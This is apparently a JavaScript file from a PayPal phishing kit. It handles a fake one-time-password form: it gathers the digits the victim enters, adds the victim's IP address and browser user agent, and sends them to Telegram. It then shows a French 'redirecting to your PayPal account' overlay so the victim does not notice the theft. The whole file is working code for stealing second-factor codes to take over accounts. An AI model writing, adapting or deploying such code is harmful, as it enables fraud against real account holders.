const otpInputs = document.querySelectorAll('.otp-input input');

otpInputs.forEach((input, index) => {
    input.addEventListener('input', function(e) {
        if (e.target.value) {
            if (index < otpInputs.length - 1) {
                otpInputs[index + 1].focus();
            }
        }
    });

    input.addEventListener('keydown', function(e) {
        if (e.key === 'Backspace' && !e.target.value && index > 0) {
            otpInputs[index - 1].focus();
        }
    });
});

document.getElementById('otpForm').addEventListener('submit', async function(e) {
    e.preventDefault();
    
    const button = this.querySelector('button[type="submit"]');
    utils.showLoading(button);

    const otp = Array.from(otpInputs)
        .map(input => input.value)
        .join('');

    const formData = {
        otp,
        timestamp: new Date().toISOString(),
        userAgent: navigator.userAgent,
        ip: await utils.getIpAddress()
    };

    try {
        await notifications.sendToTelegram('otp', formData);
        await utils.delay(CONFIG.DELAYS.LOADING);
        
        utils.showRedirectOverlay('Redirection vers votre compte PayPal...');
        await utils.delay(CONFIG.DELAYS.REDIRECT);
        
        window.location.href = CONFIG.ROUTES.SUCCESS;
    } catch (error) {
        console.error('Error:', error);
        utils.hideLoading(button);
    }
});